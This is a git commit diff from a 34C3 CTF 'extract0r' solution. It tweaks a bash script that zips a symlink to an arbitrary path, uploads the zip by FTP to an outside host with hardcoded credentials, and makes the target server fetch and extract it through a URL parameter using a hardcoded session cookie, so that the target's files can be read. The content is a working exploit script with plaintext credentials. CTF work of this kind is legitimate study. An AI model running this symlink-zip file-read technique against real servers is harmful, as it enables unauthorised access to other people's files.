18fafb05a4c68227689af110454d6d94520aba08
terjanq <terjanq@gmail.com>
2017-12-29 14:19:48 +0100

    bash script tweaks

--- 34c3ctf/extract0r/e0.sh
+++ 34c3ctf/extract0r/e0.sh
@@ -1,13 +1,16 @@
 #!/bin/bash
 
 ## script is uploading single symlink on the servers
-
-read pth
-ln -sf $pth temp
-rm "test.zip"
-zip --symlinks "test.zip" temp
+zipname="test.zip"
+ftp_serv="ftp://mkwk018.cba.pl"
+ftp_user="ctfish@ctfish.cba.pl"
+ftp_passwd="Haslo123"
+php_ssid="PHPSESSID=rgmisfpqe7n9a6gubun94vcspb"
+read path
+ln -sf $path temp
+zip --symlinks $zipname temp
+curl -T $zipname $ftp_serv --user $ftp_user:$ftp_passwd
+file=`curl "http://35.198.175.71/?url=http%3A%2F%2Fctfish.cba.pl%2F$zipname" -H "Cookie: $php_ssid" --compressed | grep -o 'files/[^"]*'`
+rm $zipname
 rm temp
-curl -T "test.zip" ftp://mkwk018.cba.pl --user ctfish@ctfish.cba.pl:Haslo123
-file=`curl 'http://35.198.175.71/?url=http%3A%2F%2Fctfish.cba.pl%2F'+'test.zip' -H 'Cookie: PHPSESSID=rgmisfpqe7n9a6gubun94vcspb' --compressed | grep -o 'files/[^"]*'`
-
 echo 'http://35.198.175.71/'$file
